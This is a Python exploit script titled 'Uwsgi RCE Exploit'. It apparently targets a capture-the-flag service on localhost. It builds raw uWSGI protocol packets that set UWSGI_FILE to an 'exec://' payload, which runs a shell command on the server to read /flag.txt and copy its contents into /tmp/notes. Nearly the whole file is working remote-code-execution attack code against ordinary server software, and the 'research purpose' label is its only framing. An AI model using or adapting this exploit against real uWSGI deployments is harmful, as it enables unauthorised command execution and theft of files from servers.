#!/usr/bin/python
# coding: utf-8
######################
# Uwsgi RCE Exploit
######################
# Author: wofeiwo@80sec.com
# Created: 2017-7-18
# Last modified: 2018-1-30
# Note: Just for research purpose

import sys
import socket
import argparse
import requests

def sz(x):
    s = hex(x if isinstance(x, int) else len(x))[2:].rjust(4, '0')
    if sys.version_info[0] == 3: pass
    s = bytes.fromhex(s) if sys.version_info[0] == 3 else s.decode('hex')
    return s[::-1]


def pack_uwsgi_vars(var):
    pk = b''
    for k, v in var.items() if hasattr(var, 'items') else var:
        pk += sz(k) + k.encode('utf8') + sz(v) + v.encode('utf8')
    result = b'\x00' + sz(pk) + b'\x00' + pk
    return result


def parse_addr(addr, default_port=None):
    port = default_port
    if isinstance(addr, str):
        if addr.isdigit():
            addr, port = '', addr
        elif ':' in addr:
            addr, _, port = addr.partition(':')
    elif isinstance(addr, (list, tuple, set)):
        addr, port = addr
    port = int(port) if port else port
    return (addr or '127.0.0.1', port)


def get_host_from_url(url):
    if '//' in url:
        url = url.split('//', 1)[1]
    host, _, url = url.partition('/')
    return (host, '/' + url)


def fetch_data(uri, payload=None, body=None):
    if 'http' not in uri:
        uri = 'http://' + uri
    s = requests.Session()
    # s.headers['UWSGI_FILE'] = payload
    if body:
        import urlparse
        body_d = dict(urlparse.parse_qsl(urlparse.urlsplit(body).path))
        d = s.post(uri, data=body_d)
    else:
        d = s.get(uri)

    return {
        'code': d.status_code,
        'text': d.text,
        'header': d.headers
    }


def ask_uwsgi(var, body=''):
    return pack_uwsgi_vars(var) + body.encode('utf8')


def curl():
    target_url = 'http://localhost:18888/?qs'
    host, uri = get_host_from_url(target_url)
    path, _, qs = uri.partition('?')
    command = r'echo "open(\"/tmp/notes/eyo-jinmo\", \"w\").write(repr(open(\"/flag.txt\").read()))"'
    payload = 'exec://' + command
    var = {
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'REQUEST_METHOD': 'GET',
        'PATH_INFO': path,
        'REQUEST_URI': uri,
        'QUERY_STRING': qs,
        'SERVER_NAME': host,
        'HTTP_HOST': host,
        'UWSGI_FILE': payload,
        'SCRIPT_NAME': target_url
    }
    return ask_uwsgi(var, 'A' * 0x10000)


def main(*args):
    print(curl())

if __name__ == '__main__':
    main()